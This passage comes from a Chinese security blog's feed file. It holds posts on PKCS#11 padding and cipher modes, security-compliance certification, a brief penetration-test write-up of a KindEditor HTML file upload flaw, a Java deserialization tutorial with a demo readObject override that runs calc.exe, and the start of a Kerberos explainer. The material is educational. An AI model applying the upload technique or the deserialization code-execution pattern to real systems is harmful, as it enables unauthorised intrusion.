Padding，最优非对称加密填充）</h2><p><strong>●</strong> OAEP 填充主要用于 RSA 加密，增强了安全性，避免了 PKCS#1 v1.5 中的某些弱点。</p><p><strong>●</strong> 在 PKCS#11 中，填充方式由 CKM_RSA_PKCS_OAEP 机制定义。</p><h3 id="工作原理：-3"><a href="#工作原理：-3" class="headerlink" title="工作原理："></a>工作原理：</h3><p><strong>●</strong> OAEP 是一种基于随机数和哈希函数的填充方式，用于增强 RSA 的安全性，防止某些已知的攻击，如选择密文攻击（CCA）。</p><p><strong>●</strong> 该填充方式使用哈希函数（如 SHA-256）和伪随机数生成器来生成填充数据。</p><h2 id="5-ISO-x2F-IEC-9797-填充（主要用于-MAC-操作）"><a href="#5-ISO-x2F-IEC-9797-填充（主要用于-MAC-操作）" class="headerlink" title="5. ISO&#x2F;IEC 9797 填充（主要用于 MAC 操作）"></a>5. ISO&#x2F;IEC 9797 填充（主要用于 MAC 操作）</h2><p><strong>●</strong> ISO 9797 是一种用于消息认证码（MAC）算法的填充标准。</p><p><strong>●</strong> PKCS#11 中使用的 MAC 算法（如 DES 或 AES 的 MAC）可能依赖此填充标准。</p><h3 id="工作原理：-4"><a href="#工作原理：-4" class="headerlink" title="工作原理："></a>工作原理：</h3><p><strong>●</strong> 该填充方式通过在消息末尾附加特定字节来使消息的长度符合块大小要求，确保消息认证码的计算完整性。</p><h2 id="PKCS-11-中填充方式的选择"><a href="#PKCS-11-中填充方式的选择" class="headerlink" title="PKCS#11 中填充方式的选择"></a>PKCS#11 中填充方式的选择</h2><p>在 PKCS#11 中，填充方式通常是由加密机制指定的，常见的加密机制包括：</p><p>1.CKM_RSA_PKCS：使用 PKCS#1 v1.5 填充方式，适用于 RSA 加密和签名。</p><p>2.CKM_RSA_PKCS_OAEP：使用 OAEP 填充，适用于增强安全性的 RSA 加密。</p><p>3.CKM_AES_CBC_PAD：AES 加密，采用 PKCS#7 填充方式。</p><p>4.CKM_DES_CBC_PAD：DES 加密，采用 PKCS#7 填充方式。</p><p>5.CKM_SHA256_RSA_PKCS：使用 SHA-256 和 PKCS#1 填充方式，适用于 RSA 签名。</p><h2 id="填充方式的作用"><a href="#填充方式的作用" class="headerlink" title="填充方式的作用"></a>填充方式的作用</h2><p>1.确保块大小匹配：分组加密算法（如 AES 和 DES）要求输入数据的长度为算法的块大小（通常是 8 字节或 16 字节）的倍数。如果输入数据的长度不足以满足这个要求，填充会将数据扩展到适当的长度。</p><p>2.防止明文结构泄漏：对于非对称加密（如 RSA），填充方式可以增加数据的随机性，防止攻击者通过已知明文的结构进行攻击。</p><p>3.提高安全性：一些高级填充方式（如 OAEP）可以增强加密算法的安全性，防止某些特定类型的攻击。</p><p><strong>如果数据块长度过长怎么办</strong></p><p><strong>ChatGPT 说：</strong></p><p>如果数据块的长度过长，通常会采取分块处理的方式进行处理，尤其是在使用分组加密算法时，如 AES、DES 等。这些算法对每个数据块进行加密，因此即使数据长度超过了单个块的大小，也可以通过分块加密的方式处理整个数据流。</p><h1 id="处理数据块过长的常见方法："><a href="#处理数据块过长的常见方法：" class="headerlink" title="处理数据块过长的常见方法："></a>处理数据块过长的常见方法：</h1><h2 id="1-分组加密模式（Block-Cipher-Modes-of-Operation）"><a href="#1-分组加密模式（Block-Cipher-Modes-of-Operation）" class="headerlink" title="1. 分组加密模式（Block Cipher Modes of Operation）"></a>1. 分组加密模式（Block Cipher Modes of Operation）</h2><p>对于超出单个块大小的数据，分组加密算法通常采用不同的加密模式来处理这些多余的块。以下是几种常见的分组加密模式：</p><h3 id="1-1-电子密码本模式（ECB-Electronic-Codebook）"><a href="#1-1-电子密码本模式（ECB-Electronic-Codebook）" class="headerlink" title="1.1 电子密码本模式（ECB - Electronic Codebook）"></a>1.1 电子密码本模式（ECB - Electronic Codebook）</h3><p><strong>●</strong> 工作原理：将明文分割成若干块，每块单独加密。每个数据块都被独立地加密为密文块。</p><p><strong>●</strong> 问题：ECB 模式的主要问题是相同的明文块会加密为相同的密文块，这容易暴露明文的结构，导致安全性较低。因此，ECB 模式并不推荐用于大多数加密场景。</p><h3 id="1-2-密码分组链接模式（CBC-Cipher-Block-Chaining）"><a href="#1-2-密码分组链接模式（CBC-Cipher-Block-Chaining）" class="headerlink" title="1.2 密码分组链接模式（CBC - Cipher Block Chaining）"></a>1.2 密码分组链接模式（CBC - Cipher Block Chaining）</h3><p><strong>●</strong> 工作原理：在 CBC 模式中，第一个明文块与一个初始化向量（IV）异或，然后加密。后续的每个明文块会与前一个密文块异或后再加密。</p><p><strong>●</strong> 优点：即使相同的明文块，在不同上下文中的加密结果也会不同，增强了安全性。</p><p><strong>●</strong> 过程：适用于处理长度超过单个块大小的明文。数据被分割为多个块，然后通过加密链的方式处理。</p><h3 id="1-3-计数器模式（CTR-Counter-Mode）"><a href="#1-3-计数器模式（CTR-Counter-Mode）" class="headerlink" title="1.3 计数器模式（CTR - Counter Mode）"></a>1.3 计数器模式（CTR - Counter Mode）</h3><p><strong>●</strong> 工作原理：CTR 模式将明文块与一个计数器异或后加密。计数器每次加密都会递增，确保每个加密块的唯一性。</p><p><strong>●</strong> 优点：CTR 模式具有并行化加密的能力，可以更高效地处理大数据块。</p><p><strong>●</strong> 应用场景：适用于处理大文件或需要高性能的场景，如文件加密或网络数据流加密。</p><h3 id="1-4-Galois-x2F-Counter模式（GCM-Galois-x2F-Counter-Mode）"><a href="#1-4-Galois-x2F-Counter模式（GCM-Galois-x2F-Counter-Mode）" class="headerlink" title="1.4 Galois&#x2F;Counter模式（GCM - Galois&#x2F;Counter Mode）"></a>1.4 Galois&#x2F;Counter模式（GCM - Galois&#x2F;Counter Mode）</h3><p><strong>●</strong> 工作原理：GCM 是 CTR 的一种变体，除了加密功能外，还提供了认证功能，确保加密数据的完整性和真实性。</p><p><strong>●</strong> 优点：不仅能处理大块数据，还可以保证数据的完整性，适用于需要高安全性的场景。</p><p><strong>●</strong> 应用场景：广泛应用于 SSL&#x2F;TLS 加密协议中，确保安全的网络通信。</p><h2 id="2-流加密算法（Stream-Cipher）"><a href="#2-流加密算法（Stream-Cipher）" class="headerlink" title="2. 流加密算法（Stream Cipher）"></a>2. 流加密算法（Stream Cipher）</h2><p>如果数据块过长，也可以考虑使用流加密算法，如 RC4、ChaCha20 等，它们不基于块操作，而是将数据视为一个流进行逐字节或逐比特加密。</p><p><strong>●</strong> 工作原理：流加密算法将数据作为一个连续的比特流进行加密，不需要进行分块。因此，数据长度越长，流加密算法的效率越能体现出来。</p><p><strong>●</strong> 优点：对于长数据流加密较为高效，尤其适用于需要实时处理的场景。</p><h2 id="3-分段处理"><a href="#3-分段处理" class="headerlink" title="3. 分段处理"></a>3. 分段处理</h2><p>如果数据块长度过长，可以将数据分段处理。加密算法会根据固定的块大小对数据进行分块，然后依次加密每个块。常见的块大小是 64 位或 128 位，具体长度取决于加密算法。</p><p><strong>步骤：</strong></p><p>1.分块：将数据按照加密算法的块大小进行分割（例如 AES 使用 128 位块，DES 使用 64 位块）。</p><p>2.加密每个块：使用选定的加密模式（如 CBC、CTR 等）对每个块逐个进行加密。</p><p>3.填充不足块：如果最后一块数据的长度不足一个完整块，则使用填充方式（如 PKCS#7 填充）填补数据。</p><p>4.串联密文：最后，将加密的密文块按顺序串联在一起，形成完整的加密结果。</p><h2 id="4-分段传输和分段解密"><a href="#4-分段传输和分段解密" class="headerlink" title="4. 分段传输和分段解密"></a>4. 分段传输和分段解密</h2><p>在传输长数据时，可以将数据分段加密，每个加密块单独传输或存储，然后在接收端进行分段解密。这种方法常用于以下场景：</p><p><strong>●</strong> 大文件加密：当需要加密一个大文件时，可以将文件分成多个块逐步加密，每次处理一个块。</p><p><strong>●</strong> 网络数据加密：对于需要通过网络传输的大量数据，可以将数据分块加密后传输，在接收端逐块解密。</p><h2 id="5-填充模式与处理溢出"><a href="#5-填充模式与处理溢出" class="headerlink" title="5. 填充模式与处理溢出"></a>5. 填充模式与处理溢出</h2><p>如果数据块长度超过加密算法的块大小，并且不是块大小的整数倍，则可能需要填充剩余的数据，使其与加密算法的块大小匹配。常见的填充方式包括：</p><p><strong>●</strong> PKCS#7 填充：常用于对称加密中的填充方式，数据不足时填充字节，使数据长度与块大小匹配。</p><p><strong>●</strong> 零填充：在数据末尾用零值字节填充，直到块大小满足加密算法的要求。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>当数据块长度过长时，常见的处理方式包括：</strong></p><p><strong>●</strong> 使用分组加密模式（如 CBC、CTR、GCM 等），对数据进行分块加密处理。</p><p><strong>●</strong> 使用流加密算法，连续加密数据流，避免分块。</p><p><strong>●</strong> 分段处理和分段传输，将大数据分块加密并依次传输或存储。</p><p><strong>●</strong> 使用适当的填充方式，确保数据长度与加密算法的块大小匹配。</p><p>通过这些方法，加密系统可以有效处理长度超过块大小的长数据，并确保数据加密的安全性和完整性。</p>]]></content>
      
      
      <categories>
          
          <category> 思考与总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考与总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全合规工作的简单思考与总结</title>
      <link href="/archives/7432e8d4.html"/>
      <url>/archives/7432e8d4.html</url>
      
        <content type="html"><![CDATA[<h1 id="总体思考"><a href="#总体思考" class="headerlink" title="总体思考"></a>总体思考</h1><p><strong>目标</strong>：降低公司被监管通报、处罚的风险，协助提升公司品牌形象，增强用户安全感。</p><p><strong>方针</strong>：突破安全红线的原则性问题绝不支持，落实监管工作的过程中优先考虑实质性合规，实质性合规难以满足的情况下优先满足形式化合规。<br>策略：资源优先满足监管要求，积极获取权威认证助力业务发展。</p><p><strong>职责</strong>：安全合规主要做好两件事，一件是揭示风险，另一件是针对揭示的风险提供方向性的风险处置方案。打个比方：业务方是开车的司机，安全在旁边说酒驾很危险，这样做既增加出车祸的风险，也可能被交警处罚，因此建议开车前不要喝酒（开车的主动权在司机，处罚的主动权在交警，安全的角色是善意提醒人）。</p><h1 id="安全认证"><a href="#安全认证" class="headerlink" title="安全认证"></a>安全认证</h1><h2 id="ISO-27001"><a href="#ISO-27001" class="headerlink" title="ISO 27001"></a>ISO 27001</h2><p><strong>1、简介</strong></p><p>ISO&#x2F;IEC27001 信息安全管理体系（ISMS——information security management system)是信息安全管理的国际标准。ISO27001认证可以说是目前业内认可度最高的国际认证。</p><p><strong>2、价值</strong></p><p>企业增信：如果你们公司有APP，那么可以直接把通过ISO27001认证写入隐私协议，你们的PR或品牌团队可以写宣传稿进行宣传，这些都是可以提升公司声誉的。<br>机构合作：如果你们公司需要和其他机构合作，按照个保法要求对合作机构进行安全尽调，根据笔者的经验，大多合作方都会问有没有等保三级和ISO27001。<br>工作基石：做完ISO27001后，遇到去做别的认证或者给监管部门上报材料等场景将会变得容易很多，可以把相关制度文档及证据材料拿来用。<br>个人绩效：如果是第一次拿证，对个人当年的绩效打分会有很大的帮助。</p><p><strong>3、点评</strong></p><p>做认证一定要找专业的咨询机构，他们不仅可以帮忙写文档，还可以一步步带着你往前，让你少踩很多坑。ISO的认证比较偏体系管理，就是说你声称什么就要做到什么，因此不要给自己写太高的要求，制度写好后最好和运维之类的部门确认一下，看他们是否能够做到。在外审开始前要特别叮嘱相关部门通过邮件等方式留存证据。</p><h2 id="等保"><a href="#等保" class="headerlink" title="等保"></a>等保</h2><p><strong>1、简介</strong></p><p>等保，即网络安全等级保护标准。2007年等级保护制度正式实施，等保是监管部门合规执法检查的依据。</p><p><strong>2、价值</strong></p><p>监管合规：等保属于强制性要求，只要企业有系统理论上就要依法做等级保护<br>机构合作：如果你们公司需要和其他机构合作，按照个保法要求对合作机构进行安全尽调，根据笔者的经验，大多合作方都会问有没有等保三级和ISO27001。<br>个人绩效：如果是第一次拿证，对个人当年的绩效打分会有很大的帮助。</p><p><strong>3、点评</strong></p><p>等保相对比较偏技术检查，自从上海某等保测评机构被处罚关停后，现在做等保严格了许多，测评师还要在公司合影打卡，混日子不太好混了，还是要认真整改，没有高危风险达到70分以上即可。</p><h2 id="ISO-27701"><a href="#ISO-27701" class="headerlink" title="ISO 27701"></a>ISO 27701</h2><p><strong>1、简介</strong></p><p>ISO27701是在ISO27001信息安全管理体系的基础上，针对隐私信息管理的要求进行了拓展。ISO27701标准包含了隐私信息保护、隐私信息风险评估、隐私信息安全控制、隐私信息保护措施等方面的要求。</p><p><strong>2、点评</strong></p><p>ISO27701建议和ISO27001一起做，这样可以节省很多资源和时间。两者所选的目标系统和涉及的公司部门也要保持一致，这样最为简单。</p><h2 id="通信网络安全防护定级备案"><a href="#通信网络安全防护定级备案" class="headerlink" title="通信网络安全防护定级备案"></a>通信网络安全防护定级备案</h2><p><strong>1、简介</strong></p><p>根据《工业和信息化部办公厅关于开展2018年电信和互联网行业网络安全检查工作的通知》要求，各网络运行单位要按照《通信网络安全防护管理办法》的规定，在工业和信息化部“通信网络安全防护管理系统”（<a href="https://www.mii-aqfh.cn)对本单位所有正式上线运行的网络和系统进行定期备案或变更备案./">https://www.mii-aqfh.cn）对本单位所有正式上线运行的网络和系统进行定期备案或变更备案。</a></p><p><strong>2、点评</strong></p><p>根据工信部的要求，所有持有增值电信许可证的企业都应该进行定级备案。目前各地方通信管理局在推广这项要求方面的力度有所不同，但在一些合作机构的安全尽调表中，可以看到工信条线安全认证的相关条目。因此，这个证书除了满足监管要求外，也具备一定的实用价值。</p><h1 id="内部自治"><a href="#内部自治" class="headerlink" title="内部自治"></a>内部自治</h1><p><strong>APP隐私合规</strong></p><p>自从2021年开始，由于大量的APP因为违规收集用户信息、获取权限等问题而被官方通报或下架，APP的隐私合规风险变得非常严峻。随之而来，为APP进行隐私合规检测的厂商也如雨后春笋般涌现。在这种严格监管的环境下，大家都变得特别紧张，产品同学也逐渐认识到改善隐私协议中的细节是一项非常重要的工作，甚至可以接受下掉一些重要权限。如果有条件的话，建议寻找一家专业的APP隐私合规检测厂商，在每次APP发版之前进行检测。</p><p><strong>体系制度建设</strong></p><p>一般来说，企业都会做等保。虽然等保更加偏重于技术方面，但对于安全管理也有一定的要求。初期可以以满足等保要求为目标，制定相应的制度文档。如果企业有条件的话，建议做ISO27001认证，一旦完成认证，体系制度这一方面基本上就没有太大的问题了。</p><p><strong>安全培训与考试</strong></p><p>对于安全合规工作而言，培训是其中重要的一环。每年进行四次培训是必要的，不仅可以作为KPI的一部分，还可以应对各种认证和检查，如ISO27001和等保等认证机构都会关注安全培训的情况。在认证工作中，培训的签到记录和现场照片是重要的证据材料，要妥善保留。<br>安排安全考试并不是一项容易的任务，尤其是对于规模较大的公司，让几千人参与考试对出题水平有较高的要求。建议将考试分为两部分，一部分是必答题，题目非常简单，这样可以提高参与率和及格率。另一部分是冲刺拿奖的题目，难度逐渐增加，这样可以更好地拉开分数差距。此外，还建议设置一些主观题，以缓解作弊的问题，避免大家都得高分，但无法确定发奖的尴尬情况。</p><p><strong>安全咨询与方案评估</strong></p><p>自个保法出台以来，大家对于个人信息的保护意识显著提高。经常有人咨询关于向合作机构发送手机号码的数量限制、需要经过哪些审批程序以及需要注意哪些事项。通常，对于这类咨询，都会建议他们先咨询法务部门，等待各项法律协议签署完毕后再走相应的流程以便留档备查。由于监管部门的严格监管，各大应用商店对APP的隐私合规检测也日益严格。现在的产品同学在设计业务时更加谨慎，不再盲目追求权限收集，而是更加克制，只收集必要的用户个人信息。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>安全合规工作要取得好的成绩，最有效的方式是通过拿证。拿证是以结果为导向的，而且成果可以很好地衡量。尽管内部治理也很重要，但其成果很难准确衡量。因此，我们应该把工作的重心和倾斜度放在拿证上。</p>]]></content>
      
      
      <categories>
          
          <category> 思考与总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考与总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KindEditor文件上传漏洞</title>
      <link href="/archives/afb5413b.html"/>
      <url>/archives/afb5413b.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本⽂章仅供学习交流使⽤，请勿将⽂中所描述内容⽤于违法犯罪⾏为。</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>对该网站进行目录爆破 发现 <strong>&#x2F;upload</strong> 响应为200，妨问该目录，发现是一个空白页面<br><img src="https://pic.888888.al/i/2023/08/15/115jqda.png" alt="0"></p><p>对该网站进行抓包，发现<strong>KindEditor</strong>字样，百度可知，KindEditor编辑器可执行html文件，在请求包中构造html文件，尝试上传。<br><img src="https://pic.888888.al/i/2023/08/15/11a6w9l.png" alt="1"></p><p>上传成功，并返回文件保存路径。<br><img src="https://pic.888888.al/i/2023/08/15/11b6vli.png" alt="2"></p><p>妨问该路径，html文件被执行。<br><img src="https://pic.888888.al/i/2023/08/15/11brvmy.png" alt="3"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA反序列化漏洞基础</title>
      <link href="/archives/5a428c68.html"/>
      <url>/archives/5a428c68.html</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA反序列化漏洞基础"><a href="#JAVA反序列化漏洞基础" class="headerlink" title="JAVA反序列化漏洞基础"></a>JAVA反序列化漏洞基础</h1><h2 id="1-1-什么是序列化和反序列化"><a href="#1-1-什么是序列化和反序列化" class="headerlink" title="1.1 什么是序列化和反序列化"></a>1.1 什么是序列化和反序列化</h2><p>Java序列化是指把Java对象转换为字节序列的过程；</p><p>Java反序列化是指把字节序列恢复为Java对象的过程；<br><img src="https://pic.888888.al/i/2023/08/15/10xozk9.png" alt="0"></p><h2 id="1-2-为什么要序列化"><a href="#1-2-为什么要序列化" class="headerlink" title="1.2 为什么要序列化"></a>1.2 为什么要序列化</h2><p>对象不只是存储在内存中，它还需要在传输网络中进行传输，并且保存起来之后下次再加载出来，这时<br>候就需要序列化技术。</p><p>Java的序列化技术就是把对象转换成一串由二进制字节组成的数组，然后将这二进制数据保存在磁盘或<br>传输网络。而后需要用到这对象时，磁盘或者网络接收者可以通过反序列化得到此对象，达到对象持久<br>化的目的。</p><h2 id="1-3-ObjectOutputStream-与-ObjectInputStream类"><a href="#1-3-ObjectOutputStream-与-ObjectInputStream类" class="headerlink" title="1.3 ObjectOutputStream 与 ObjectInputStream类"></a>1.3 ObjectOutputStream 与 ObjectInputStream类</h2><h3 id="1-3-1-ObjectOutputStream类"><a href="#1-3-1-ObjectOutputStream类" class="headerlink" title="1.3.1 ObjectOutputStream类"></a>1.3.1 ObjectOutputStream类</h3><p>java.io.ObjectOutputStream 类，将Java对象的原始数据类型写出到文件,实现对象的持久存储。<br>序列化操作<br>一个对象要想序列化，必须满足两个条件:</p><p><strong>▪</strong> 该类必须实现 java.io.Serializable 接口， Serializable 是一个标记接口，不实现此接口的类将不会<br>使任何状态序列化或反序列化，会抛出 NotSerializableException 。</p><p><strong>▪</strong> 该类的所有属性必须是可序列化的。如果有一个属性不需要可序列化的，则该属性必须注明是瞬态<br>的，使用transient 关键字修饰。</p><p>示例：</p><p>Employee.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable&#123;</span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line"><span class="keyword">public</span> String address;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">transient</span> <span class="type">int</span> age; <span class="comment">// transient瞬态修饰成员,不会被序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addressCheck</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Address check : &quot;</span> + name + <span class="string">&quot; -- &quot;</span> + address);</span><br><span class="line"><span class="comment">//此处省略tostring等方法</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SerializeDemo.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeDemo</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="type">Employee</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>();</span><br><span class="line">e.name = <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">e.age = <span class="number">20</span>;</span><br><span class="line">e.address = <span class="string">&quot;shenzhen&quot;</span>;</span><br><span class="line"><span class="comment">// 1.创建序列化流</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line"><span class="comment">// 2.写出对象</span></span><br><span class="line">outputStream.writeObject(e);</span><br><span class="line"><span class="comment">// 3.释放资源</span></span><br><span class="line">outputStream.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将Employee对象写入到了employee.txt文件中</p><p>开头的 AC ED 00 05 为序列化内容的特征</p><h3 id="1-3-2-ObjectInputStream类"><a href="#1-3-2-ObjectInputStream类" class="headerlink" title="1.3.2 ObjectInputStream类"></a>1.3.2 ObjectInputStream类</h3><p>如果能找到一个对象的class文件，我们可以进行反序列化操作，调用 ObjectInputStream 读取对象的<br>方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializeDemo</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,</span><br><span class="line">ClassNotFoundException &#123;</span><br><span class="line"><span class="comment">// 1.创建反序列化流</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line"><span class="comment">// 2.使用ObjectInputStream中的readObject读取一个对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> inputStream.readObject();</span><br><span class="line"><span class="comment">// 3.释放资源</span></span><br><span class="line">inputStream.close();</span><br><span class="line">System.out.println(o);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印结果：</p><p>反序列化操作就是从二进制文件中提取对象</p><h2 id="1-4-反序列化漏洞的基本原理"><a href="#1-4-反序列化漏洞的基本原理" class="headerlink" title="1.4 反序列化漏洞的基本原理"></a>1.4 反序列化漏洞的基本原理</h2><p>在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法被重写不当时产生漏洞</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demon</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="comment">//定义myObj对象</span></span><br><span class="line"><span class="type">MyObject</span> <span class="variable">myObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObject</span>();</span><br><span class="line">myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line"><span class="comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>));</span><br><span class="line"><span class="comment">//writeObject()方法将myObj对象写入object文件</span></span><br><span class="line">os.writeObject(myObj);</span><br><span class="line">os.close();</span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>));</span><br><span class="line"><span class="comment">//恢复对象</span></span><br><span class="line"><span class="type">MyObject</span> <span class="variable">objectFromDisk</span> <span class="operator">=</span> (MyObject)ois.readObject();</span><br><span class="line">System.out.println(objectFromDisk.name);</span><br><span class="line">ois.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line"><span class="comment">//重写readObject()方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,</span><br><span class="line">ClassNotFoundException&#123;</span><br><span class="line"><span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">in.defaultReadObject();</span><br><span class="line"><span class="comment">//执行打开计算器程序命令</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处重写了readObject方法，执行了 Runtime.getRuntime().exec()</p><p>defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行方法</p><p>运行流程：</p><ol><li><p>myObj对象序列化进object文件</p></li><li><p>从object反序列化对象-&gt;调用readObject方法-&gt;执行Runtime.getRuntime().exec(“calc.exe”);</p></li></ol><h2 id="1-5-java类中serialVersionUID的作用"><a href="#1-5-java类中serialVersionUID的作用" class="headerlink" title="1.5 java类中serialVersionUID的作用"></a>1.5 java类中serialVersionUID的作用</h2><p>serialVersionUID适用于java序列化机制。简单来说，JAVA序列化的机制是通过 判断类的serialVersionUID来验证的版本一致的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较。如果相同说明是一致的，可以进行反序列化，否则会出现反序列化版本一致的异常，即是InvalidCastException。</p><h3 id="1-5-1-serialVersionUID有两种显示的生成方式："><a href="#1-5-1-serialVersionUID有两种显示的生成方式：" class="headerlink" title="1.5.1 serialVersionUID有两种显示的生成方式："></a>1.5.1 serialVersionUID有两种显示的生成方式：</h3><p>一是 默认的1L，比如：private static final long serialVersionUID &#x3D; 1L; </p><p>二是根据包名，类名，继承关系，非私有的方法和属性，以及参数，返回值等诸多因子计算得出的，极<br>度复杂生成的一个64位的哈希字段。基本上计算出来的这个值是唯一的。比如：private static final<br>long serialVersionUID &#x3D; xxxxL;</p><p>注意：显示声明serialVersionUID可以避免对象不一致</p><p>设置自动生存uid<br><img src="https://pic.888888.al/i/2023/08/15/10y4t8s.png" alt="1"><br><img src="https://pic.888888.al/i/2023/08/15/10y8gg8.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> JAVA反序列化漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA反序列化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos协议详解（转载）</title>
      <link href="/archives/c0777afa.html"/>
      <url>/archives/c0777afa.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>Kerberos协议 是一个专注于验证通信双方身份的网络协议，不同于其他网络安全协议的保证整个通信过程的传输安全，Kerberos侧重于通信前双方身份的认定工作，帮助客户端以及服务端验证是真正的自己并非他人，从而使得通信两端能够完全信任对方的身份，在一个不安全的网络中完成一次安全的身份认证继而进行安全的通信。</p><h1 id="二、什么是Kerberos协议"><a href="#二、什么是Kerberos协议" class="headerlink" title="二、什么是Kerberos协议"></a>二、什么是Kerberos协议</h1><p>Kerberos是一种计算机网络认证协议 ，其设计目标是通过密钥系统为网络中通信的客户机(Client)&#x2F;服务器(Server)应用程序提供严格的身份验证服务，确保通信双方身份的真实性和安全性。不同于其他网络服务，Kerberos协议中不是所有的客户端向想要访问的网络服务发起请求，他就能建立连接然后进行加密通信，而是在发起服务请求后必须先进行一系列的身份认证，包括客户端和服务端两方的双向认证，只有当通信双方都认证通过对方身份之后，才可以互相建立起连接，进行网络通信。即Kerberos协议的侧重在于认证通信双方的身份，客户端需要确认即将访问的网络服务就是自己所想要访问的服务而不是一个伪造的服务器，而服务端需要确认这个客户端是一个身份真实，安全可靠的客户端，而不是一个想要进行恶意网络攻击的用户。</p><h1 id="三、Kerberos协议角色组成"><a href="#三、Kerberos协议角色组成" class="headerlink" title="三、Kerberos协议角色组成"></a>三、Kerberos协议角色组成</h1><p>Kerberos协议中存在三个角色，分别是：</p><p> ●  客户端(Client)：发送请求的一方</p><p> ● 服务端(Server)：接收请求的一方</p><p> ● 密钥分发中心(Key distribution KDC)</p><p>密钥分发中心又分为两个部分，分别是：</p><p><font color=red>AS(Authentication 